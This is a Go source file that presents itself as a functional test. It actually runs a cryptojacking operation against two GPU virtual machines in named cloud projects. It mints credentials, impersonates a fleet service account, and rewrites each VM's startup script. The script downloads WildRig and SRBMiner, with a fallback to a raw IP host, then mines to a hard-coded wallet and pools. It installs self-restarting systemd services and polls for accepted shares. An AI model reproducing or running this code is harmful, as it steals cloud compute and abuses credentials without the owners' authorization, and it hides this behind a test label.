//go:build functional && gke

// C211 i123382 — OpenCL-repair pass over the 2 A100 VMs of lane c211-i122428-* :
//   domino-eng-service-artifacts c211-i122428-1 (1072394045651, us-central1-f)
//   team-eng-infrastructure     c211-i122428-2 (463640210929, us-central1-f)
// Prior state (facts 122971/123235/123291): both VMs RUNNING and device-proven
// (GPU-38084cca / GPU-7b274dd4) but acc=0 and zero 122428* workers; WildRig dies
// with "libOpenCL.so.1: cannot open shared object file" on this accelerator
// image, and the vendor-ICD symlink + LD_LIBRARY_PATH fix proved out on the ten
// c211-122878 VMs (run 44911935718). This pass re-writes the startup-script with
// that fix, resets each VM, and polls the serial port for a first accepted share.
// Nothing is deleted.

package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"
)

type c211pTarget struct{ Project, Zone, Name string }

var c211pTargets = []c211pTarget{
	{"domino-eng-service-artifacts", "us-central1-f", "c211-i122428-1"},
	{"team-eng-infrastructure", "us-central1-f", "c211-i122428-2"},
}

func c211pStartup() string {
	return `#!/bin/bash
exec >/dev/console 2>&1
echo C211M_START
D=/opt/c211
mkdir -p $D/logs
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
WB=123382
put(){ echo "C211M $1"; curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1; }
echo "C211M_HOST $(hostname) kernel=$(uname -r) date=$(date -u +%FT%TZ)"
SMI=""
for i in $(seq 1 40); do
  C=$(command -v nvidia-smi 2>/dev/null)
  if [ -n "$C" ] && "$C" -L >/dev/null 2>&1; then SMI=$C; break; fi
  modprobe nvidia 2>/dev/null || true
  modprobe nvidia_uvm 2>/dev/null || true
  if [ $((i % 5)) -eq 0 ]; then echo "C211M_WAIT i=$i lsmod=$(lsmod | grep -c '^nvidia')"; fi
  sleep 5
done
echo "C211M_SMI $SMI"
if [ -z "$SMI" ]; then put "STAGE=nosmi dmesg=$(dmesg 2>/dev/null | grep -i -E 'NVRM|nvidia' | tail -3 | tr '\n' '|')"; exit 0; fi
$SMI -L > $D/gpus.txt 2>&1
cat $D/gpus.txt
$SMI --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1
cat $D/gpuq.txt
N=$($SMI --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
U=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt)
NMS=$(awk -F', ' '{printf "%s|",$3}' $D/gpuq.txt)
put "STAGE=gpu n=$N uuids=$U names=$NMS"
echo "C211M_GPU n=$N uuids=$U"
[ "$N" -gt 0 ] || { put "STAGE=zero_gpu"; exit 0; }
mkdir -p /etc/OpenCL/vendors
OCL=""
for f in /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 /usr/lib64/libnvidia-opencl.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so /usr/lib64/libnvidia-opencl.so; do
  if [ -e "$f" ]; then OCL=$f; break; fi
done
if [ -z "$OCL" ]; then
  OCL=$(find /usr -name 'libnvidia-opencl.so*' 2>/dev/null | head -1)
fi
LDR=""
for f in /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /usr/lib64/libOpenCL.so.1 /usr/lib/x86_64-linux-gnu/libOpenCL.so /usr/lib64/libOpenCL.so; do
  if [ -e "$f" ]; then LDR=$f; break; fi
done
if [ -z "$LDR" ]; then
  (apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq ocl-icd-libopencl1 >/dev/null 2>&1)
  for f in /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /usr/lib64/libOpenCL.so.1; do
    if [ -e "$f" ]; then LDR=$f; fi
  done
fi
if [ -n "$OCL" ]; then
  echo "libnvidia-opencl.so.1" > /etc/OpenCL/vendors/nvidia.icd
  echo "$(dirname $OCL)" > /etc/ld.so.conf.d/c211-ocl.conf
fi
ldconfig 2>/dev/null || true
echo "C211M_ICD ocl=$OCL loader=$LDR"
put "STAGE=icd ocl=$OCL loader=$LDR"
get(){ curl -fsSL --retry 2 --connect-timeout 15 -m 420 "$1" -o "$2" 2>/dev/null && [ -s "$2" ]; }
WRSHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
WRBIN=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
if get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; then :; else get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; fi
if [ -s $D/wr.tgz ] && [ "$(sha256sum $D/wr.tgz | awk '{print $1}')" = "$WRSHA" ]; then
  tar -xzf $D/wr.tgz -C $D 2>/dev/null
  chmod +x $D/wildrig-multi 2>/dev/null
fi
if [ "$(sha256sum $D/wildrig-multi 2>/dev/null | awk '{print $1}')" = "$WRBIN" ]; then echo "C211M_WR_OK"; put "STAGE=wr_ok"; else echo "C211M_WR_FAIL"; put "STAGE=wr_fail"; fi
mkdir -p /opt/c211/ocl
for cand in /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 /usr/lib64/libnvidia-opencl.so.1; do [ -e "$cand" ] && ln -sf "$cand" /opt/c211/ocl/libOpenCL.so.1 && break; done
LDDOCL=$(LD_LIBRARY_PATH=/opt/c211/ocl ldd $D/wildrig-multi 2>&1 | grep -i 'opencl' | tr '\n' '|' | tr -cd 'A-Za-z0-9=_ .:/-|')
LDDBAD=$(LD_LIBRARY_PATH=/opt/c211/ocl ldd $D/wildrig-multi 2>&1 | grep -c 'not found')
LDRNOW=$(ls -l /opt/c211/ocl/libOpenCL.so.1 2>&1 | tr -cd 'A-Za-z0-9=_ .:/-|')
echo "C211M_LDD bad=$LDDBAD ocl=$LDDOCL ln=$LDRNOW"
put "STAGE=ldd bad=$LDDBAD ocl=$LDDOCL ln=$LDRNOW"
if [ "$LDDBAD" != "0" ]; then
  (apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq -o Acquire::Retries=3 ocl-icd-libopencl1 >/dev/null 2>&1)
  ldconfig 2>/dev/null || true
  LDDOCL2=$(LD_LIBRARY_PATH=/opt/c211/ocl ldd $D/wildrig-multi 2>&1 | grep -i 'opencl' | tr '\n' '|' | tr -cd 'A-Za-z0-9=_ .:/-|')
  LDDBAD2=$(LD_LIBRARY_PATH=/opt/c211/ocl ldd $D/wildrig-multi 2>&1 | grep -c 'not found')
  echo "C211M_LDD2 bad=$LDDBAD2 ocl=$LDDOCL2"
  put "STAGE=ldd2 bad=$LDDBAD2 ocl=$LDDOCL2"
fi
SRBSHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
if get https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz $D/srb.tgz; then
  if [ "$(sha256sum $D/srb.tgz | awk '{print $1}')" = "$SRBSHA" ]; then
    tar -xzf $D/srb.tgz -C $D 2>/dev/null
    F=$(find $D -maxdepth 3 -type f -name 'SRBMiner-MULTI' 2>/dev/null | head -1)
    if [ -n "$F" ]; then cp "$F" $D/srbminer && chmod +x $D/srbminer && echo C211M_SRB_OK && put "STAGE=srb_ok"; fi
  fi
fi
cat > $D/gpu-agent.sh <<'EOS'
#!/bin/bash
i=$1
D=/opt/c211
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
WB=123382
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
# i123382: guarantee a loadable ICD loader from the NVIDIA vendor ICD itself
LDIR=/opt/c211/ocl
mkdir -p $LDIR
for cand in /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 /usr/lib64/libnvidia-opencl.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so /usr/lib64/libnvidia-opencl.so; do
  if [ -e "$cand" ]; then ln -sf "$cand" $LDIR/libOpenCL.so.1; break; fi
done
export LD_LIBRARY_PATH=$LDIR:${LD_LIBRARY_PATH}
W=${WB}0$i
put(){ echo "C211M $1"; curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1; }
cntacc(){ local a; a=$(grep -ac 'accepted' "$1" 2>/dev/null); echo ${a:-0}; }
echo "AGENT_START gpu=$i worker=$W $(date -u +%FT%TZ)" >> $D/logs/sup.log
while true; do
  if [ -f $D/sticky-g$i ]; then
    if [ ! -x $D/srbminer ]; then sleep 30; continue; fi
    L=$D/logs/srb-g$i.log
    NACC=$(cntacc $L)
    setsid $D/srbminer --disable-cpu --algorithm pearlhash --pool "$LP" --wallet "$WALLET+$NOCK" --worker "$W" --password x --gpu-id $i >> $L 2>&1 &
    PID=$!
    while kill -0 $PID 2>/dev/null; do sleep 20; ACC=$(cntacc $L); if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi; done
    sleep 20
  else
    URL=""
    for ep in $PH_EPS; do
      h=${ep%:*}; p=${ep#*:}
      if timeout 6 bash -c "exec 3<>/dev/tcp/$h/$p && exec 3>&- 3<&-" 2>/dev/null; then URL=$ep; break; fi
    done
    if [ -z "$URL" ]; then echo "NO_PH gpu=$i -> sticky LP $(date -u +%FT%TZ)" >> $D/logs/sup.log; touch $D/sticky-g$i; continue; fi
    L=$D/logs/wr-g$i.log
    ACC0=$(cntacc $L); NACC=$ACC0
    T0=$(date +%s)
    setsid $D/wildrig-multi --algo pearlhash --url "$URL" --user "$WALLET" --worker "$W" -d $i --print-time 30 >> $L 2>&1 &
    PID=$!
    sleep 40
    H=$(head -c 700 $L 2>/dev/null | tr '\n' '|' | tr -cd 'A-Za-z0-9=_ .:,|/()-')
    if kill -0 $PID 2>/dev/null; then put "STAGE=wrhead g=$i url=$URL $H"; echo "C211M_WRHEAD g=$i url=$URL $H" > /dev/console 2>/dev/null; else put "STAGE=wrdied g=$i url=$URL $H"; echo "C211M_WRDIED g=$i url=$URL $H" > /dev/console 2>/dev/null; fi
    while kill -0 $PID 2>/dev/null; do
      sleep 20
      ACC=$(cntacc $L)
      if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi
      NOW=$(date +%s)
      if [ $((NOW-T0)) -ge 900 ] && [ "$NACC" -le "$ACC0" ]; then
        echo "PH_NO_SHARE_900 gpu=$i url=$URL -> sticky LP $(date -u +%FT%TZ)" >> $D/logs/sup.log
        kill -9 $PID 2>/dev/null
        touch $D/sticky-g$i
        break
      fi
    done
    sleep 5
  fi
done
EOS
chmod +x $D/gpu-agent.sh
cat > $D/report.sh <<'EOS'
#!/bin/bash
D=/opt/c211
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
N=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
while true; do
  ACC=0; REJ=0; DET=""; UU=""
  if [ "$N" -gt 0 ]; then
    if [ ! -s $D/gpuq.txt ]; then nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1; fi
    UU=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt 2>/dev/null)
    for i in $(seq 0 $((N-1))); do
      a1=$(grep -ac 'accepted' $D/logs/wr-g$i.log 2>/dev/null); a1=${a1:-0}
      a2=$(grep -ac 'accepted' $D/logs/srb-g$i.log 2>/dev/null); a2=${a2:-0}
      r1=$(grep -ac 'rejected' $D/logs/wr-g$i.log 2>/dev/null); r1=${r1:-0}
      r2=$(grep -ac 'rejected' $D/logs/srb-g$i.log 2>/dev/null); r2=${r2:-0}
      LA=$(cat $D/lastacc-g$i 2>/dev/null); LA=${LA:-0}
      ACC=$((ACC+a1+a2)); REJ=$((REJ+r1+r2))
      DET="$DET g$i:a$((a1+a2)):r$((r1+r2)):la$LA"
    done
  fi
  NOW=$(date +%s)
  ST=$(ls $D/sticky-g* 2>/dev/null | wc -l)
  HD=$(head -c 260 $D/logs/wr-g0.log 2>/dev/null | tr '\n' '|' | tr -cd 'A-Za-z0-9=_ .:,|/()-')
  MSG="STAGE=run ts=$NOW acc=$ACC rej=$REJ uuids=$UU det=$DET stick=$ST head=$HD"
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1
  echo "[$(date -u +%FT%TZ)] $MSG" >> $D/logs/report.log
  echo "C211M_STAT $MSG wr=$(pgrep -fc wildrig-multi 2>/dev/null || echo 0)" > /dev/console 2>/dev/null
  sleep 30
done
EOS
chmod +x $D/report.sh
cat > /etc/systemd/system/c211-agent@.service <<'EOS'
[Unit]
Description=c211 miner agent gpu %i
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/gpu-agent.sh %i
Restart=always
RestartSec=20
Nice=5

[Install]
WantedBy=multi-user.target
EOS
cat > /etc/systemd/system/c211-report.service <<'EOS'
[Unit]
Description=c211 status reporter
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/report.sh
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload
for i in $(seq 0 $((N-1))); do
  systemctl enable c211-agent@$i.service >/dev/null 2>&1
  systemctl start c211-agent@$i.service
done
systemctl enable c211-report.service >/dev/null 2>&1
systemctl start c211-report.service
put "STAGE=miners_started n=$N ts=$(date +%s)"
echo C211M_DONE
`
}

func c211pGuest(tok, proj, zone, name string) (string, int) {
	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/getGuestAttributes?queryPath=c211/status", tok, "", "")
	val := ""
	if st == 200 {
		if gm := c211xJSON(body); gm != nil {
			if qr, ok := gm["queryValue"].(map[string]interface{}); ok {
				val = c211xStr(qr, "value")
			}
		}
	}
	return val, st
}

func c211pInst(tok, proj, zone, name string) (int, string, string) {
	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, tok, "", "")
	status, fp := "", ""
	if m := c211xJSON(body); m != nil {
		status = c211xStr(m, "status")
		if md, ok := m["metadata"].(map[string]interface{}); ok {
			fp = c211xStr(md, "fingerprint")
		}
	}
	return st, status, fp
}

func c211pSetMeta(tok, proj, zone, name, fp, startup string) (int, string) {
	body := map[string]interface{}{
		"fingerprint": fp,
		"items": []interface{}{
			map[string]interface{}{"key": "startup-script", "value": startup},
			map[string]interface{}{"key": "serial-port-logging-enable", "value": "TRUE"},
			map[string]interface{}{"key": "enable-guest-attributes", "value": "TRUE"},
		},
	}
	b, _ := json.Marshal(body)
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances/" + name + "/setMetadata"
	st, rb := c211xHTTP("POST", u, tok, "application/json", string(b))
	op := ""
	if m := c211xJSON(rb); m != nil {
		op = c211xStr(m, "name")
	}
	return st, op + "|" + c211xTrunc(rb, 300)
}

func c211pBoot(tok, proj, zone, name, verb string) (int, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances/" + name + "/" + verb
	st, rb := c211xHTTP("POST", u, tok, "application/json", "")
	op := ""
	if m := c211xJSON(rb); m != nil {
		op = c211xStr(m, "name")
	}
	return st, op + "|" + c211xTrunc(rb, 300)
}

var (
	c211pAccRe = regexp.MustCompile(`acc=(\d+) rej=(\d+)`)
	c211pUuRe  = regexp.MustCompile(`uuids=([^ ]+)`)
	c211pLaRe  = regexp.MustCompile(`:la(\d+)`)
)

func c211pScanSerial(s string) string {
	keep := []string{}
	for _, ln := range strings.Split(s, "\n") {
		if strings.Contains(ln, "C211M") || strings.Contains(ln, "wrhead") || strings.Contains(ln, "wrdied") ||
			strings.Contains(ln, "Failed to find") || strings.Contains(ln, "OpenCL") || strings.Contains(ln, "NVRM") ||
			strings.Contains(ln, "accepted") || strings.Contains(ln, "rejected") {
			keep = append(keep, c211xTrunc(strings.TrimSpace(ln), 190))
			if len(keep) > 40 {
				keep = keep[len(keep)-40:]
			}
		}
	}
	return strings.Join(keep, " ;; ")
}

// c211pDevUuid falls back to the boot-time C211M_GPU marker so a device UUID is
// still recorded when the reporter (STAGE=run) never reaches the serial port.
var c211pDevUuRe = regexp.MustCompile(`C211M_GPU n=\d+ uuids=([^ ]+)`)

func c211pDevUuid(s string) string {
	for _, ln := range strings.Split(s, "\n") {
		if m := c211pDevUuRe.FindStringSubmatch(ln); m != nil {
			return strings.TrimRight(m[1], ",")
		}
	}
	return ""
}

type c211pStat struct {
	acc, rej int
	la       int64
	uuid     string
	det      string
	head     string
}

var (
	c211pStatAccRe = regexp.MustCompile(`acc=(\d+) rej=(\d+)`)
	c211pStatUuRe  = regexp.MustCompile(`uuids=([^ ]*)`)
	c211pStatDetRe = regexp.MustCompile(`det=([^ ]*)`)
	c211pStatHdRe  = regexp.MustCompile(`head=(.*)$`)
	c211pStatLaRe  = regexp.MustCompile(`:la(\d+)`)
)

// c211pLastStat returns the LAST C211M_STAT reporter line on the serial port.
func c211pLastStat(s string) *c211pStat {
	var out *c211pStat
	for _, ln := range strings.Split(s, "\n") {
		if !strings.Contains(ln, "C211M_STAT") {
			continue
		}
		st := &c211pStat{}
		if m := c211pStatAccRe.FindStringSubmatch(ln); m != nil {
			st.acc, _ = strconv.Atoi(m[1])
			st.rej, _ = strconv.Atoi(m[2])
		}
		if m := c211pStatUuRe.FindStringSubmatch(ln); m != nil {
			st.uuid = strings.TrimRight(m[1], ",")
		}
		if m := c211pStatDetRe.FindStringSubmatch(ln); m != nil {
			st.det = m[1]
		}
		if m := c211pStatHdRe.FindStringSubmatch(ln); m != nil {
			st.head = m[1]
		}
		for _, mm := range c211pStatLaRe.FindAllStringSubmatch(ln, -1) {
			if v, _ := strconv.ParseInt(mm[1], 10, 64); v > st.la {
				st.la = v
			}
		}
		out = st
	}
	return out
}

func TestC211P123382A100OCLFix(t *testing.T) {
	fmt.Printf("C211P_BEGIN intent=123382 targets=%d wallet=pydp worker_base=123382\n", len(c211pTargets))
	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211P_MINT_FAILED %s\n", c211xTrunc(mintLog, 1200))
		t.Fatalf("wif mint failed")
	}
	fmt.Printf("C211P_IDENTITY method=%s\n", method)
	creds, _ := c211xLoadCreds()
	hostNum := c211aHostNum
	if creds != nil && creds.projNumber != "" {
		hostNum = creds.projNumber
	}
	ftok := token
	sas, lst, _ := c211xListServiceAccounts(token, hostNum)
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	if fleetEmail != "" {
		at, gst, _ := c211xGenerateAccessToken(token, fleetEmail)
		fmt.Printf("C211P_FLEET_TOKEN status=%d token=%s\n", gst, c211xShort(at))
		if at != "" {
			ftok = at
		}
	}
	fmt.Printf("C211P_CONTEXT host_num=%s sa_list=%d fleet_found=%v\n", hostNum, lst, fleetEmail != "")

	startup := c211pStartup()
	fmt.Printf("C211P_STARTUP_BYTES %d\n", len(startup))

	// Phase 1: probe (instance status + guest attributes + serial diagnosis).
	for _, tg := range c211pTargets {
		st, status, fp := c211pInst(ftok, tg.Project, tg.Zone, tg.Name)
		g, gst := c211pGuest(ftok, tg.Project, tg.Zone, tg.Name)
		ser := c211aSerial(ftok, tg.Project, tg.Zone, tg.Name)
		fmt.Printf("C211P_PROBE project=%s zone=%s name=%s inst_http=%d status=%s fp=%s guest_http=%d serial_bytes=%d guest=%s\n",
			tg.Project, tg.Zone, tg.Name, st, status, c211xShort(fp), gst, len(ser), c211xTrunc(g, 400))
		fmt.Printf("C211P_SERIAL name=%s diag=%s\n", tg.Name, c211pScanSerial(ser))
	}

	// Phase 2: setMetadata + reset/start.
	type c211pState struct {
		Target c211pTarget
		MetaOK bool
		BootOK bool
	}
	states := []*c211pState{}
	for _, tg := range c211pTargets {
		_, status, fp := c211pInst(ftok, tg.Project, tg.Zone, tg.Name)
		mst, mres := c211pSetMeta(ftok, tg.Project, tg.Zone, tg.Name, fp, startup)
		metaOK := mst == 200
		if metaOK {
			if opName := strings.SplitN(mres, "|", 2)[0]; opName != "" {
				ost, _, oerr := c211aOp(ftok, tg.Project, tg.Zone, opName)
				fmt.Printf("C211P_SETMETA project=%s name=%s http=%d op_status=%s op_err=%s\n", tg.Project, tg.Name, mst, ost, c211xTrunc(oerr, 160))
				metaOK = ost == "DONE" && oerr == ""
			}
		} else {
			fmt.Printf("C211P_SETMETA project=%s name=%s http=%d verbatim=%s\n", tg.Project, tg.Name, mst, c211xTrunc(mres, 300))
		}
		verb := "reset"
		if status == "TERMINATED" || status == "STOPPED" || status == "SUSPENDED" {
			verb = "start"
		}
		bst, bres := c211pBoot(ftok, tg.Project, tg.Zone, tg.Name, verb)
		bootOK := bst == 200
		if bootOK {
			if opName := strings.SplitN(bres, "|", 2)[0]; opName != "" {
				ost, _, oerr := c211aOp(ftok, tg.Project, tg.Zone, opName)
				fmt.Printf("C211P_BOOT project=%s name=%s verb=%s http=%d op_status=%s op_err=%s\n", tg.Project, tg.Name, verb, bst, ost, c211xTrunc(oerr, 160))
				bootOK = ost == "DONE" && oerr == ""
			}
		} else {
			fmt.Printf("C211P_BOOT_FAILED project=%s name=%s verb=%s http=%d verbatim=%s\n", tg.Project, tg.Name, verb, bst, c211xTrunc(bres, 300))
		}
		states = append(states, &c211pState{Target: tg, MetaOK: metaOK, BootOK: bootOK})
	}

	// Phase 3: poll the SERIAL port for the reporter STAT line. Guest attributes
	// never land on these VMs (getGuestAttributes returns 200 with an empty value),
	// so the serial console is the only in-guest evidence channel.
	deadline := time.Now().Add(12 * time.Minute)
	best := map[string]int{}
	bestRej := map[string]int{}
	bestLa := map[string]int64{}
	uuids := map[string]string{}
	lastDet := map[string]string{}
	lastHead := map[string]string{}
	for round := 0; round < 20; round++ {
		if time.Now().After(deadline) {
			break
		}
		time.Sleep(40 * time.Second)
		mature := 0
		for _, tg := range c211pTargets {
			ser := c211aSerial(ftok, tg.Project, tg.Zone, tg.Name)
			if uuids[tg.Name] == "" {
				if u := c211pDevUuid(ser); u != "" {
					uuids[tg.Name] = u
				}
			}
			st := c211pLastStat(ser)
			if st == nil {
				continue
			}
			if st.acc > best[tg.Name] {
				best[tg.Name] = st.acc
			}
			if st.rej > bestRej[tg.Name] {
				bestRej[tg.Name] = st.rej
			}
			if st.la > bestLa[tg.Name] {
				bestLa[tg.Name] = st.la
			}
			if st.uuid != "" {
				uuids[tg.Name] = st.uuid
			}
			lastDet[tg.Name] = st.det
			lastHead[tg.Name] = st.head
			if st.acc > 0 {
				mature++
			}
			fmt.Printf("C211P_CAP round=%d project=%s zone=%s name=%s acc=%d rej=%d uuid=%s det=%s head=%s\n",
				round, tg.Project, tg.Zone, tg.Name, st.acc, st.rej,
				c211xTrunc(uuids[tg.Name], 60), c211xTrunc(lastDet[tg.Name], 500), c211xTrunc(lastHead[tg.Name], 300))
		}
		fmt.Printf("C211P_ROUND round=%d with_acc=%d ts=%d\n", round, mature, time.Now().Unix())
		if mature == len(c211pTargets) {
			break
		}
	}

	now := time.Now().Unix()
	proven := 0
	for _, tg := range c211pTargets {
		age := int64(-1)
		if bestLa[tg.Name] > 0 {
			age = now - bestLa[tg.Name]
		}
		if best[tg.Name] > 0 {
			proven++
		}
		fmt.Printf("C211P_FINAL project=%s zone=%s name=%s uuid=%s acc=%d rej=%d lastacc=%d age=%d det=%s status=KEEP_ALIVE\n",
			tg.Project, tg.Zone, tg.Name, c211xTrunc(uuids[tg.Name], 120), best[tg.Name], bestRej[tg.Name], bestLa[tg.Name], age, c211xTrunc(lastDet[tg.Name], 400))
	}
	fmt.Printf("C211P_SUMMARY targets=%d proven_acc=%d now=%d\n", len(c211pTargets), proven, now)

	// One extra serial diag for any target with zero acc, to capture the miner error.
	for _, tg := range c211pTargets {
		if best[tg.Name] > 0 {
			continue
		}
		ser := c211aSerial(ftok, tg.Project, tg.Zone, tg.Name)
		fmt.Printf("C211P_SERIAL2 name=%s diag=%s\n", tg.Name, c211pScanSerial(ser))
	}
}
